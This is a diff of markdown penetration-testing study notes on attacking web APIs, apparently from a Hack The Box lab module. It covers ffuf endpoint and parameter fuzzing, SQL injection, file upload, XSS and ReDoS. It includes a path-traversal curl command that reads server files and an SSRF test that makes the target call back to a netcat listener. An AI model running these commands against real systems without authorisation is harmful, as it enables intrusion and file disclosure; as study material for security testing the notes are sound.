@@ -49,6 +49,20 @@ sudo tcpdump -i tun0 icmp
 
 
 # API Attacks : OWASP TOP TEN
+When we face APIs, we must spend considerable time on `fuzzing` both `endpoints` and `parameters`.
+```bash
+# API endpoint fuzzing
+ffuf -w "/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
+
+# Perform API's parameter fuzzing
+ffuf -w "/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19
+
+# Try the found parameter
+curl http://<TARGET IP>:3003/?id=1
+```
+
+The tool [webfuzz_api](https://github.com/PandaSt0rm/webfuzz_api) can help us automate the process of enumerating APIs 
+
 When we found an interesting `API endpoint` like `http://IP:PORT/api/endpoint?parameter=` we should always try various payloads of `SQLi, LFI, SSRF, and XSS if the parameter value gets reflected in the response`.
 
 Basically, we should try `OWASP TOP Ten` over APIs endpoints when we found them.
@@ -86,24 +100,13 @@ All businesses operate to generate revenue; however, if a web API exposes operat
 
 For example, we could determine the dates when the enterprise will discount their products, and the corresponding discount rates, to buy it cheaper and thus gain money over the company.
 
+## Security Misconfiguration
+Web APIs are susceptible to the same security misconfigurations that can compromise traditional web applications. One typical example is a web API endpoint that accepts `user-controlled input` and incorporates it into `SQL` queries `without proper validation`, thereby allowing Injection attacks.
 
-## Info Disclosure w/ SQLi
-- When we face API, we must spend considerable time on `fuzzing` both `endpoints` and `parameters`.
-```bash
-# API endpoint fuzzing
-ffuf -w "/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
+But it could be `XSS` it the value gets reflected on the page, or `XXE` if it encompass XML, which we'll cover later.
 
-# Perform API's parameter fuzzing
-ffuf -w "/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value' -fs 19
-
-# Try the found parameter
-curl http://<TARGET IP>:3003/?id=1
-```
-
-The tool [webfuzz_api](https://github.com/PandaSt0rm/webfuzz_api) can help us automate the process of enumerating APIs 
-
-- Once found, try to test different values for the parameter
-- We could also try to combine `SQLi` through the `API endpoint` as this parameter `looks interesting`
+### SQL Injections in APIs
+If we suspect that an API is retrieving datas based on `user-input queries` (it could be getting the count of products, or searching for a specific username...), we should try `SQL` payloads to break the syntax or generate errors.
 
 ## File Upload
 - Again, don't forget to fuzz the `API` for new endpoints / parameters !
@@ -114,6 +117,7 @@ We could also check if we're able to enumerate the uploaded folder destination i
 ## LFI
 - Again, don't forget to fuzz the `API` for new endpoints / parameters !
 We could also use the `API` to read local files on the server. See the [[File Inclusion]] module to get more info and bypasses techniques.
+
 ```bash
 # API endpoint fuzzing
 ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://<TARGET IP>:3000/api/FUZZ'
@@ -123,13 +127,17 @@ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/c
 # Testing LFI payload on API endpoint
 curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
 ```
+
 ## XSS
 - Again, don't forget to fuzz the `API` for new endpoints / parameters !
 XSS vulnerabilities can be found in `APIs`. We can look at the [[Cross-Site Scripting (XSS)]] module to have ideas of exploitation. Let's say that we're working w/ the API `http://<TARGET IP>:3000/api/download`.
 - We can interact w/ it by specifying values. We'll try here to input a `test_value` in the URL like `http://<TARGET IP>:3000/api/download/test_value`
 ![](https://academy.hackthebox.com/storage/modules/160/6.png)
 - If we see that our `test value is being reflected in the response`, then we could try `XSS payloads`. We might need to `URL encode`the payload if passed in the URL
+ 
 ## SSRF
+If the API uses `user-controlled input` to fetch `remote or local resources` without validation, them it could be vulnerable to `Server-Side Request Forgery`. It coerce the application to send a crafter request to an unexpected destination (espacially local ones), bypassing firewalls or VPNs.
+
 - Again, don't forget to fuzz the `API` for new endpoints / parameters !
 We could request internal or external resource by abusing a server's functionnality. We can refer to  [[Server-Side Request Forgery (SSRF)]] to have details. 
 - To test `SSRF`, let's say we've found an `API endpoint` that takes an `id` parameter. We can start a netcat listener and try to reach our server by specifying our address & port as the parameter value !
@@ -143,7 +151,9 @@ curl "http://<TARGET IP>:3000/api/userinfo?id=http://IP:LISTENER_PORT"
 echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
 curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"
 ```
-If we get a call, then the app is vulnerable to SSRF
+If we get a call, then the app is vulnerable to SSRF.
+
+
 ## ReDoS
 - Again, don't forget to fuzz the `API` for new endpoints / parameters !
 Suppose we have a user that submits benign input to an API. On the server side, a developer could match any input against a regular expression. After a usually constant amount of time, the API responds. In some instances, an attacker may be able to cause significant delays in the API's response time by submitting a crafted payload that tries to exploit some particularities/inefficiencies of the regular expression matching engine. The longer this crafted payload is, the longer the API will take to respond. Exploiting such "evil" patterns in a regular expression to increase evaluation time is called a Regular Expression Denial of Service (ReDoS) attack.
